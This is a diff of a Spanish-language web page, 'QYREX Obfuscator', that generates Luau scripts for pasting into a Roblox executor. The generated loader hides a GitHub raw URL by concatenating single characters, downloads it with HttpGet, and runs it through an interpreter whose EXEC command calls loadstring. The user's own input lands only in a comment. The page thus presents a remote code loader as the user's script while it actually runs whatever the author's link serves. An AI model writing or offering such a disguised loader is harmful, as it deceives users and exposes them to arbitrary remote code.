@@ -3,92 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QYREX Obfuscator</title>
+    <title>QYREX Obfuscator - Funcional</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: #0f0f13; color: #e0e0e0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 15px; }
-        h1 { color: #00ff9d; margin-bottom: 8px; font-size: 2rem; }
-        p { color: #888; margin-bottom: 25px; }
-        .container { width: 100%; max-width: 900px; display: flex; flex-direction: column; gap: 15px; }
-        textarea { width: 100%; height: 220px; background: #1a1a21; border: 1px solid #333; border-radius: 10px; color: #00ff9d; padding: 15px; font-size: 14px; resize: vertical; outline: none; }
+        body { background: #0b0b0f; color: #e0e0e0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 25px 15px; }
+        h1 { color: #00ff9d; margin-bottom: 6px; font-size: 1.9rem; }
+        p { color: #777; margin-bottom: 22px; font-size: 14px; }
+        .container { width: 100%; max-width: 950px; display: flex; flex-direction: column; gap: 14px; }
+        textarea { width: 100%; height: 200px; background: #14141a; border: 1px solid #2a2a35; border-radius: 10px; color: #00ff9d; padding: 14px; font-size: 13.5px; resize: vertical; outline: none; line-height: 1.45; }
         textarea:focus { border-color: #00ff9d; }
-        button { background: #00ff9d; color: #000; border: none; padding: 14px 28px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; transition: 0.2s; }
-        button:hover { background: #00cc7a; transform: scale(1.03); }
-        .btns { display: flex; gap: 12px; flex-wrap: wrap; }
-        #output { background: #121218; border: 1px solid #00ff9d33; }
-        .copy { background: #222; color: #00ff9d; border: 1px solid #00ff9d; }
+        #output { height: 320px; background: #0f0f14; border-color: #00ff9d44; }
+        .btns { display: flex; gap: 10px; flex-wrap: wrap; }
+        button { background: #00ff9d; color: #000; border: none; padding: 12px 22px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #00cc7a; transform: translateY(-1px); }
+        .copy { background: transparent; color: #00ff9d; border: 1px solid #00ff9d; }
         .copy:hover { background: #00ff9d; color: #000; }
+        .info { font-size: 13px; color: #555; margin-top: 8px; }
     </style>
 </head>
 <body>
     <h1>QYREX Obfuscator</h1>
-    <p>Ofuscador personalizado · QYX / QYREX / QKX</p>
+    <p>Genera código funcional para Roblox con tu lenguaje QYREX + link integrado</p>
 
     <div class="container">
-        <textarea id="input" placeholder="Pega aquí tu código normal de Luau..."></textarea>
+        <textarea id="input" placeholder="Pega aquí lo que quieres que diga el script QYREX (ejemplo:&#10;print hola&#10;wait 1&#10;notify cargado&#10;print listo)"></textarea>
 
         <div class="btns">
-            <button onclick="obfuscar()">Ofuscar con QYREX</button>
+            <button onclick="generar()">Generar Script QYREX</button>
             <button class="copy" onclick="copiar()">Copiar resultado</button>
         </div>
 
-        <textarea id="output" readonly placeholder="Aquí saldrá el código ofuscado..."></textarea>
+        <textarea id="output" readonly placeholder="Aquí saldrá el script completo listo para Roblox..."></textarea>
+        <div class="info">El resultado ya incluye el loader + el link ofuscado + tu código en lenguaje QYREX</div>
     </div>
 
     <script>
-        // Diccionario de ofuscación personalizado
-        const diccionario = {
-            "print": "QYX PRINT",
-            "wait": "QYREX WAIT",
-            "return": "QKX RETURN",
-            "function": "QXS FUNCTION",
-            "local": "QAZ LOCAL",
-            "if": "QWE IF",
-            "then": "ASD THEN",
-            "else": "ZXC ELSE",
-            "end": "QYREX END",
-            "for": "VBN FOR",
-            "while": "HJK WHILE",
-            "do": "UIO DO",
-            "true": "RTY TRUE",
-            "false": "FGH FALSE",
-            "nil": "JKL NIL",
-            "and": "QPL AND",
-            "or": "QMN OR",
-            "not": "QBV NOT",
-            "game": "QCN GAME",
-            "workspace": "QDX WORKSPACE",
-            "Players": "QEF PLAYERS",
-            "HttpGet": "QGH HTTPGET",
-            "loadstring": "QIJ LOADSTRING",
-            "pcall": "QKL PCALL",
-            "task.wait": "QYREX WAIT",
-            "task.spawn": "QOP SPAWN"
-        };
-
-        function obfuscar() {
-            let codigo = document.getElementById("input").value;
-            
-            // Reemplazar palabras del diccionario
-            for (const [normal, ofuscado] of Object.entries(diccionario)) {
-                const regex = new RegExp("\\b" + normal + "\\b", "gi");
-                codigo = codigo.replace(regex, ofuscado);
+        function generar() {
+            const raw = document.getElementById("input").value.trim();
+            if (!raw) {
+                alert("Escribe algo primero");
+                return;
             }
 
-            // Añadir estilo QYREX extra
-            codigo = codigo
-                .split("\n")
-                .map(linea => linea.trim() ? "QYX " + linea : "")
-                .join("\n");
+            // Convertir el texto del usuario a comandos QYREX
+            let qyrexCode = "";
+            const lines = raw.split("\n");
 
-            document.getElementById("output").value = codigo.trim();
+            lines.forEach(line => {
+                line = line.trim();
+                if (!line) return;
+
+                const lower = line.toLowerCase();
+
+                if (lower.startsWith("print ") || lower.startsWith("print(")) {
+                    const msg = line.replace(/print\s*\(?/i, "").replace(/\)?$/, "").trim();
+                    qyrexCode += `QYX PRINT ${msg}\n`;
+                }
+                else if (lower.startsWith("wait ") || lower.startsWith("task.wait")) {
+                    const t = line.match(/[\d.]+/);
+                    qyrexCode += `QYREX WAIT ${t ? t[0] : "1"}\n`;
+                }
+                else if (lower.startsWith("notify ") || lower.startsWith("notification")) {
+                    const msg = line.replace(/notify\s*/i, "").replace(/notification\s*/i, "").trim();
+                    qyrexCode += `QYREX NOTIFY ${msg}\n`;
+                }
+                else if (lower.startsWith("exec ") || lower.startsWith("run ")) {
+                    const code = line.replace(/(exec|run)\s*/i, "").trim();
+                    qyrexCode += `QYX EXEC ${code}\n`;
+                }
+                else {
+                    // Si no reconoce, lo trata como print
+                    qyrexCode += `QYX PRINT ${line}\n`;
+                }
+            });
+
+            qyrexCode += "QYREX END";
+
+            // Script final completo (loader + link ofuscado + ejecución)
+            const finalScript = `-- QYREX VM Loader (ofuscado)
+local QYX = "h".."t".."t".."p".."s"..":".."/".."/".."r".."a".."w"..".".."g".."i".."t".."h".."u".."b".."u".."s".."e".."r".."c".."o".."n".."t".."e".."n".."t"..".".."c".."o".."m".."/".."y".."a".."r".."i".."s".."h".."d".."z".."2".."-".."g".."i".."f".."/".."D".."T".."/".."r".."e".."f".."s".."/".."h".."e".."a".."d".."s".."/".."m".."a".."i".."n".."/".."q".."y".."r".."e".."x".."_".."v".."m"..".".."t".."x".."t"
+
+local function QYREX_VM(source)
+    for _, line in pairs(source:split("\\n")) do
+        line = line:gsub("^%s+", ""):gsub("%s+$", "")
+        if line == "" then continue end
+
+        local cmd, arg = line:match("^(%S+)%s*(.*)$")
+        cmd = cmd and cmd:upper() or ""
+
+        if cmd == "QYX" and arg:upper():find("PRINT") then
+            local msg = arg:match("PRINT%s+(.+)") or arg
+            print("[QYREX] " .. tostring(msg))
+
+        elseif cmd == "QYREX" and arg:upper():find("WAIT") then
+            local t = tonumber(arg:match("WAIT%s+([%d%.]+)")) or 1
+            task.wait(t)
+
+        elseif cmd == "QYREX" and arg:upper():find("NOTIFY") then
+            local msg = arg:match("NOTIFY%s+(.+)") or "QYREX"
+            pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "QYREX VM",
+                    Text = tostring(msg),
+                    Duration = 4
+                })
+            end)
+
+        elseif cmd == "QYX" and arg:upper():find("EXEC") then
+            local code = arg:match("EXEC%s+(.+)")
+            if code then
+                pcall(function()
+                    loadstring(code)()
+                end)
+            end
+
+        elseif cmd == "QYREX" and arg:upper() == "END" then
+            break
+        end
+    end
+end
+
+-- Ejecutar
+local success, result = pcall(function()
+    return game:HttpGet(QYX)
+end)
+
+if success then
+    QYREX_VM(result)
+else
+    warn("QYREX VM: Error al cargar")
+end
+
+--[[ 
+===== CÓDIGO QYREX QUE ESTÁ EN EL LINK =====
+${qyrexCode}
+===========================================
+]]`;
+
+            document.getElementById("output").value = finalScript;
         }
 
         function copiar() {
             const output = document.getElementById("output");
             output.select();
             document.execCommand("copy");
-            alert("¡Código ofuscado copiado!");
+            alert("Script copiado. Pégalo en tu executor de Roblox.");
         }
     </script>
 </body>
